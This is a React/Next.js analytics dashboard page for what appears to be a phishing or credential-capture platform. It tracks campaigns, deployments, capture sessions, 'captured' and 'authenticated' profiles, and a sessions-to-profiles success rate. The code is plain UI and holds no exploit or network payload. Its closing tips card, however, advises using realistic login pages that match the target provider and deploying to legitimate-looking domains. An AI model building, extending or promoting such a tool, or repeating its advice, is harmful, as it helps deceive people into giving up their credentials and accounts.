'use client';

import { useEffect, useState } from 'react';
import Link from 'next/link';
import apiClient from '@/lib/api-client';
import { BarChart3, TrendingUp, Target, Database, Activity, Award, Zap, Users, CheckCircle, ArrowLeft } from 'lucide-react';
import { toast } from 'sonner';

interface AnalyticsSummary {
  totalCampaigns: number;
  activeCampaigns: number;
  pausedCampaigns: number;
  totalDeployments: number;
  totalSessions: number;
  completedSessions: number;
  activeSessions: number;
  expiredSessions: number;
  totalProfiles: number;
  authenticatedProfiles: number;
  totalCaptures: number;
  successRate: number;
}

export default function AnalyticsPage() {
  const [summary, setSummary] = useState<AnalyticsSummary | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadAnalytics();
  }, []);

  const loadAnalytics = async () => {
    try {
      const response = await apiClient.getAnalyticsSummary();
      if (response.data.success) {
        setSummary(response.data.summary);
      }
    } catch (error: any) {
      console.error('Failed to load analytics:', error);
      toast.error(error.response?.data?.error || 'Failed to load analytics');
    } finally {
      setLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center py-12">
        <div className="h-8 w-8 border-2 border-[#4F7FFF] border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  if (!summary) {
    return (
      <div className="flex items-center justify-center py-12">
        <div className="text-center">
          <BarChart3 className="h-16 w-16 mx-auto mb-4 text-white/20" />
          <p className="text-white/50">Failed to load analytics</p>
        </div>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-7xl p-8 space-y-6">
      {/* Header */}
      <div>
        {/* Back Link */}
        <Link href="/dashboard" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
          <ArrowLeft className="h-3.5 w-3.5" />
          Back
        </Link>
        {/* Breadcrumb */}
        <div className="mb-2 text-sm text-white/50">
          <Link href="/dashboard" className="hover:text-white/70 transition-colors cursor-pointer">Dashboard</Link>
          <span> / </span>
          <span>Analytics</span>
        </div>
        <h1 className="text-2xl font-semibold text-white">Analytics</h1>
        <p className="text-sm text-white/50 mt-1">Track your campaign performance and statistics</p>
      </div>

      {/* Key Metrics Grid */}
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="w-10 h-10 rounded-lg bg-[#4F7FFF]/10 flex items-center justify-center">
              <Target className="h-5 w-5 text-[#4F7FFF]" />
            </div>
          </div>
          <div className="text-2xl font-semibold text-white mb-1">{summary.totalCampaigns}</div>
          <div className="text-sm text-white/50">Total Campaigns</div>
          <div className="text-xs text-white/40 mt-2">
            {summary.activeCampaigns} active • {summary.pausedCampaigns} paused
          </div>
        </div>

        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="w-10 h-10 rounded-lg bg-[#10B981]/10 flex items-center justify-center">
              <Activity className="h-5 w-5 text-[#10B981]" />
            </div>
          </div>
          <div className="text-2xl font-semibold text-white mb-1">{summary.totalSessions}</div>
          <div className="text-sm text-white/50">Total Sessions</div>
          <div className="text-xs text-white/40 mt-2">
            {summary.completedSessions} completed
          </div>
        </div>

        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="w-10 h-10 rounded-lg bg-[#8B5CF6]/10 flex items-center justify-center">
              <Database className="h-5 w-5 text-[#8B5CF6]" />
            </div>
          </div>
          <div className="text-2xl font-semibold text-white mb-1">{summary.totalProfiles}</div>
          <div className="text-sm text-white/50">Captured Profiles</div>
          <div className="text-xs text-white/40 mt-2">
            {summary.authenticatedProfiles} authenticated
          </div>
        </div>

        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="w-10 h-10 rounded-lg bg-[#F59E0B]/10 flex items-center justify-center">
              <TrendingUp className="h-5 w-5 text-[#F59E0B]" />
            </div>
          </div>
          <div className="text-2xl font-semibold text-white mb-1">{summary.successRate.toFixed(1)}%</div>
          <div className="text-sm text-white/50">Success Rate</div>
          <div className="text-xs text-[#10B981] mt-2">
            {summary.totalCaptures} total captures
          </div>
        </div>
      </div>

      {/* Campaign Performance */}
      <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 rounded-lg bg-[#4F7FFF]/10 flex items-center justify-center">
            <Target className="h-5 w-5 text-[#4F7FFF]" />
          </div>
          <div>
            <h2 className="text-lg font-medium text-white">Campaign Performance</h2>
            <p className="text-sm text-white/50">Overview of all your campaigns</p>
          </div>
        </div>

        <div className="grid md:grid-cols-2 gap-6">
          <div className="space-y-4">
            <div>
              <div className="flex items-center justify-between mb-3">
                <span className="text-sm text-white/70">Active Campaigns</span>
                <span className="text-sm font-medium text-white">
                  {summary.activeCampaigns} / {summary.totalCampaigns}
                </span>
              </div>
              <div className="w-full bg-white/5 rounded-full h-2.5">
                <div
                  className="bg-[#10B981] h-2.5 rounded-full transition-all"
                  style={{
                    width: `${summary.totalCampaigns > 0 ? (summary.activeCampaigns / summary.totalCampaigns) * 100 : 0}%`
                  }}
                />
              </div>
            </div>

            <div className="pt-4">
              <div className="text-3xl font-semibold text-[#10B981] mb-1">{summary.activeCampaigns}</div>
              <div className="text-sm text-white/50">Currently running</div>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <div className="flex items-center justify-between mb-3">
                <span className="text-sm text-white/70">Deployments</span>
                <span className="text-sm font-medium text-white">{summary.totalDeployments}</span>
              </div>
              <div className="pt-2">
                <div className="text-3xl font-semibold text-[#4F7FFF] mb-1">{summary.totalDeployments}</div>
                <div className="text-sm text-white/50">
                  Avg {summary.totalCampaigns > 0 ? (summary.totalDeployments / summary.totalCampaigns).toFixed(1) : 0} per campaign
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Session Analytics */}
      <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 rounded-lg bg-[#10B981]/10 flex items-center justify-center">
            <Activity className="h-5 w-5 text-[#10B981]" />
          </div>
          <div>
            <h2 className="text-lg font-medium text-white">Session Statistics</h2>
            <p className="text-sm text-white/50">Breakdown of capture session outcomes</p>
          </div>
        </div>

        <div className="space-y-6">
          {/* Completed Sessions */}
          <div>
            <div className="flex justify-between items-center mb-3">
              <div className="flex items-center gap-2">
                <CheckCircle className="h-4 w-4 text-[#10B981]" />
                <span className="text-sm font-medium text-white">Completed Sessions</span>
              </div>
              <span className="text-sm font-semibold text-[#10B981]">
                {summary.completedSessions} ({summary.totalSessions > 0 ? ((summary.completedSessions / summary.totalSessions) * 100).toFixed(1) : 0}%)
              </span>
            </div>
            <div className="w-full bg-white/5 rounded-full h-2.5">
              <div
                className="bg-[#10B981] h-2.5 rounded-full transition-all"
                style={{
                  width: `${summary.totalSessions > 0 ? (summary.completedSessions / summary.totalSessions) * 100 : 0}%`
                }}
              />
            </div>
          </div>

          {/* Active Sessions */}
          <div>
            <div className="flex justify-between items-center mb-3">
              <div className="flex items-center gap-2">
                <Zap className="h-4 w-4 text-[#4F7FFF]" />
                <span className="text-sm font-medium text-white">Active Sessions</span>
              </div>
              <span className="text-sm font-semibold text-[#4F7FFF]">
                {summary.activeSessions} ({summary.totalSessions > 0 ? ((summary.activeSessions / summary.totalSessions) * 100).toFixed(1) : 0}%)
              </span>
            </div>
            <div className="w-full bg-white/5 rounded-full h-2.5">
              <div
                className="bg-[#4F7FFF] h-2.5 rounded-full transition-all"
                style={{
                  width: `${summary.totalSessions > 0 ? (summary.activeSessions / summary.totalSessions) * 100 : 0}%`
                }}
              />
            </div>
          </div>

          {/* Expired Sessions */}
          <div>
            <div className="flex justify-between items-center mb-3">
              <div className="flex items-center gap-2">
                <Activity className="h-4 w-4 text-white/50" />
                <span className="text-sm font-medium text-white">Expired Sessions</span>
              </div>
              <span className="text-sm font-semibold text-white/70">
                {summary.expiredSessions} ({summary.totalSessions > 0 ? ((summary.expiredSessions / summary.totalSessions) * 100).toFixed(1) : 0}%)
              </span>
            </div>
            <div className="w-full bg-white/5 rounded-full h-2.5">
              <div
                className="bg-white/30 h-2.5 rounded-full transition-all"
                style={{
                  width: `${summary.totalSessions > 0 ? (summary.expiredSessions / summary.totalSessions) * 100 : 0}%`
                }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* Profile Analytics */}
      <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 rounded-lg bg-[#8B5CF6]/10 flex items-center justify-center">
            <Database className="h-5 w-5 text-[#8B5CF6]" />
          </div>
          <div>
            <h2 className="text-lg font-medium text-white">Profile Statistics</h2>
            <p className="text-sm text-white/50">Authentication success metrics</p>
          </div>
        </div>

        <div className="grid md:grid-cols-2 gap-6">
          <div className="space-y-4">
            <div className="text-sm font-medium text-white/70 mb-3">Authentication Status</div>
            <div className="space-y-3">
              <div className="flex items-center justify-between p-3 rounded-lg bg-white/5">
                <span className="text-sm text-white">Authenticated</span>
                <span className="font-semibold text-[#10B981]">{summary.authenticatedProfiles}</span>
              </div>
              <div className="flex items-center justify-between p-3 rounded-lg bg-white/5">
                <span className="text-sm text-white">Not Authenticated</span>
                <span className="font-semibold text-white/70">
                  {summary.totalProfiles - summary.authenticatedProfiles}
                </span>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <div className="text-sm font-medium text-white/70 mb-3">Conversion Rate</div>
            <div className="text-center p-6 rounded-xl bg-gradient-to-br from-[#4F7FFF]/10 to-[#8B5CF6]/10 border border-[#4F7FFF]/20">
              <div className="flex items-center justify-center gap-2 mb-2">
                <Award className="h-6 w-6 text-[#4F7FFF]" />
                <div className="text-4xl font-bold text-white">
                  {summary.successRate.toFixed(1)}%
                </div>
              </div>
              <div className="text-sm text-white/50">
                Sessions → Profiles
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tips Card */}
      <div className="rounded-xl border border-[#8B5CF6]/20 bg-[#8B5CF6]/10 p-6">
        <div className="flex gap-4">
          <div className="w-10 h-10 rounded-lg bg-[#8B5CF6]/20 flex items-center justify-center flex-shrink-0">
            <BarChart3 className="h-5 w-5 text-[#8B5CF6]" />
          </div>
          <div className="space-y-3 text-sm">
            <p className="font-medium text-white">Tips to Improve Your Success Rate:</p>
            <ul className="list-disc list-inside space-y-1.5 text-white/70">
              <li>Use realistic login pages that match the target provider</li>
              <li>Deploy to domains that look legitimate</li>
              <li>Monitor session activity and optimize based on patterns</li>
              <li>Keep your campaigns active and deployments maintained</li>
              <li>Review expired sessions to understand drop-off points</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
